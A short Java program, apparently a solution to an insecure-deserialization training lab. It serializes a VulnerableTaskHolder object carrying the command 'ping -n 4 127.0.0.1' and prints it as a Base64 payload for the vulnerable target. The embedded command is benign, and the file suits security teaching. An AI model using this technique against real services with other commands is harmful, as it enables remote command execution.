/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Main.java to edit this template
 */
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;
import org.dummy.insecure.framework.VulnerableTaskHolder;


public class Program {
    public static void main(String args[]) throws Exception{
        VulnerableTaskHolder vulnObj = new VulnerableTaskHolder("ping","ping -n 4 127.0.0.1");
		
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(vulnObj);
        oos.close();
        System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));
    }
}
